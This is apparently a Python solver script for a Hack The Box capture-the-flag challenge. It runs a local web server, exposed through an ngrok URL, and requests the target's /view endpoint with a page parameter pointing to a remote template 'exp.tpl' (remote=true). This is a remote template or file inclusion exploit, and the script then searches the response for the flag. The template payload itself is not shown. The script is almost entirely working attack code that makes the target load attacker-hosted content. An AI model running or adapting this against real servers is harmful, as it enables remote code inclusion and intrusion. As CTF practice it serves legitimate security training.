#!/usr/bin/env python3
import re
import requests
import sys
import http.server
import threading


flag_re = 'HTB{.*}'


def start_server():
    server_address = ('localhost', 8000)
    httpd = http.server.HTTPServer(
        server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ngrok-url> <challenge-url>")
        exit(-1)

    ngrok_url = sys.argv[1]
    challenge_url = sys.argv[2]

    s = requests.Session()

    print("Sending payload...")

    print("Starting server...")
    thread = threading.Thread(target=start_server)
    thread.daemon = True
    thread.start()
    print('Server started.')

    print("Sending request...")
    url = f"{challenge_url}/view?page={ngrok_url}/exp.tpl&remote=true"
    r = s.get(url)

    result = re.search(flag_re, r.text)
    if result:
        print(f"Flag: {result.group()}")
    else:
        print("No flag found.")
